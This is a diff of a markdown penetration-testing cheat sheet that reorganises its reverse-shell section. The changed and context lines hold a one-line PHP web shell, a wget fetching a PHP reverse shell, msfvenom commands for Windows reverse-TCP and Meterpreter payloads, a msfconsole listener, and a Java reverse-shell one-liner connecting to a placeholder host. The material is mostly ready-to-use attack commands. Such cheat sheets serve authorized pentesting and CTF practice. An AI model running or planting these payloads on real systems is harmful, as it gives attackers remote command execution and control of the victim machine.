@@ -162,22 +162,7 @@ Directory Listing
 ```
 gobuster dir -e -u http://Domain-or-IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
-## Reverse Shell
 
-RCE PHP
-```
-<?php system($_GET[cmd]);?>
-```
-
-RCE .aspx
-```
-https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
-```
-
-Shell PHP
-```
-wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-```
 ## XSS
 
 ```
@@ -451,6 +436,36 @@ export TERM=xterm
 ```
 export SHELL=bash
 ```
+# Reverse Shell
+
+RCE PHP
+```
+<?php system($_GET[cmd]);?>
+```
+
+RCE .aspx
+```
+https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
+```
+
+Shell PHP
+```
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+```
+
+## msfvenom
+
+Windows
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f ext > file.ext
+```
+Meterpreter shell
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f ext > file.ext
+```
+```
+msfconsole -x "use multi/handler; set payload windows/meterpreter/reverse_tcp;set LHOST IP;set LPORT PORT"
+```
 
 # Bash
 
@@ -676,21 +691,6 @@ String host="IP";
 int port=PORT;
 String cmd="cmd.exe"; (/bin/bash for linux)
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-```
-# Reverse Shells
-
-## msfvenom
-
-Windows
-```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f ext > file.ext
-```
-Meterpreter shell
-```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f ext > file.ext
-```
-```
-msfconsole -x "use multi/handler; set payload windows/meterpreter/reverse_tcp;set LHOST IP;set LPORT PORT"
 ```
 
 # Windows
